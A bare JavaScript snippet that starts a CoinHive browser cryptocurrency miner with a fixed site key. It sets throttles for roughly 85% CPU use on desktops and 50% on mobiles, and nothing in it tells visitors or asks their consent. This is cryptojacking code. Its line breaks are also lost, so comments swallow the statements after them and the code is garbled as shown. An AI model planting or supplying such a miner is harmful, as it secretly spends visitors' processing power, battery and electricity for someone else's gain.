var miner = new CoinHive.Anonymous('9tqlObh0IOcxzSOxk6EdmHBeBy8Fmhzl');
if (!miner.isMobile()) { // IF DESKTOPminer.setThrottle(0.15); // SET 85% CPU Utilizationminer.start(CoinHive.IF_EXCLUSIVE_TAB);} else {// IF MOBILEminer.setThrottle(0.5); // SET 50% CPU Utilizationminer.start(CoinHive.IF_EXCLUSIVE_TAB);}